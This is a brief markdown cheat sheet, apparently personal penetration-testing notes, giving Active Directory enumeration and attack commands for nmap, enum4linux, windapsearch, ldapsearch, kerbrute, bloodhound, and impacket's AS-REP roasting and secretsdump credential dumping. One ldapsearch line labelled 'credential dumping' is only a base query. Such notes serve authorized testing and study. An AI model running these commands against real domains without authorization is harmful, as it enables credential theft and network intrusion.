
## AD MindMap
https://www.xmind.net/m/5dypm8/

## Tools
### nmap
- enum ldap properties
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 $ip -Pn
```

### enum4linux
- list share, get domain name etc..
```bash
enum4linux -a $ip
```
- enumerate users
```bash
enum4linux -U $ip | grep 'user:'
```

### windapsearch
- enumerate users, domain name
```bash
python3 windapsearch.py --dc-ip $ip --users --full > wdapusers.txt
grep sAMAccountName wdapusers.txt | cut -d " " -f 2 > users.txt
```

### ldapsearch
- enumerate ldap properties
```bash
ldapsearch -x -h $ip -s base
```
- enumerate users
```bash
ldapsearch -h $ip -p 389 -x -b "dc=domain,dc=local"
```
- credential dumping
```bash
ldapsearch -LLL -x -H ldap://$ip -b "dc=domain,dc=local" -s base '(objectclass=*)'
```

### kerbrute
```sh
kerbrute userenum --dc $ip -d $dom /path/to/userlist
```

### impacket
- ASRepRoast
```sh
/usr/local/bin/GetNPUsers.py domain.tld/ -dc-ip domaincontroller -usersfile validuserlist
```
- Dump Secret
```sh
/usr/local/bin/secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
```

### bloodhound
```bash
pip3 install bloodhound
python3 -m bloodhound -d domain.tld -u username -p "password" -gc dc.domain.tld -c all -ns 0.0.0.0
```
